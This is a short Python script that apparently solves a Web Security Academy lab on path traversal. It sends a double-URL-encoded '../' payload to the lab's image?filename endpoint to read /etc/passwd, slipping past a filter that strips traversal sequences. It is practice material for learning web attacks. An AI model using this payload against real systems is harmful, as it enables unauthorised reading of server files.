# Vulnerability :- Path Traversal
# Lab Name :- File path traversal, traversal sequences stripped with superfluous URL-decode

import requests

url = "https://0aa4007103b2f90081c8ad8c000a00a8.web-security-academy.net" # Change Me Without Trailing Slashes

def i_am_attacking():
    payload = "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65/etc/passwd" # Double Url Encoded String
    payload_with_url = f"{url}/image?filename={payload}"
    r = requests.get(payload_with_url)
    print()
    print(r.text)
i_am_attacking()